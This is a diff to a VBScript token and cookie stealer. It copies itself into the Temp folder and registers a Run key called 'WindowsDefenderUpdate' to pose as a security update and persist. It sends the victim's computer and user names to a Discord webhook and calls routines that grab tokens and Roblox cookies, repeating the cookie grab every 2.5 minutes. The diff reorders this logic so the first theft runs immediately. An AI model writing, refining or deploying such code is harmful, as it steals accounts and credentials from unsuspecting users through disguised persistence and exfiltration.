@@ -9,29 +9,29 @@ WH_ONLINE = "https://discord.com/api/webhooks/1563322005359689802/j8YrC7L0NiTS0X
 PC   = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 isFirstRun = True
-lastCookie = ""
 
 On Error Resume Next
 Dim selfPath: selfPath = WScript.ScriptFullName
 Dim tempPath: tempPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\wdu.vbs"
 
+' 1. Copy to Temp and setup registry IN THE BACKGROUND so it doesn't block the first grab
 If LCase(selfPath) <> LCase(tempPath) Then
     fso.CopyFile selfPath, tempPath, True
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsDefenderUpdate", "wscript.exe //B """ & tempPath & """", "REG_SZ"
-    
-    SendWebhook WH_ONLINE, "{""embeds"":[{""title"":""User Online"",""description"":""Client: " & PC & " / " & USER & """,""color"":65280}]}"
-    Call GrabTokens
-    
     sh.Run "wscript.exe //B """ & tempPath & """", 0, False
-    WScript.Quit
+    Call GrabTokens
 End If
 On Error Goto 0
 
-' GRAB INSTANTLY ON FIRST RUN
+' 2. Ping Online
+SendWebhook WH_ONLINE, "{""embeds"":[{""title"":""User Online"",""description"":""Client: " & PC & " / " & USER & """,""color"":65280}]}"
+
+' 3. GRAB INSTANTLY
 Call GrabRoblox
 isFirstRun = False
 
-' THEN LOOP FOR REGRABS
+' 4. Keep looping for regrabs
+lastCookie = ""
 Do
     WScript.Sleep 150000 ' 2.5 minutes
     Call GrabRoblox
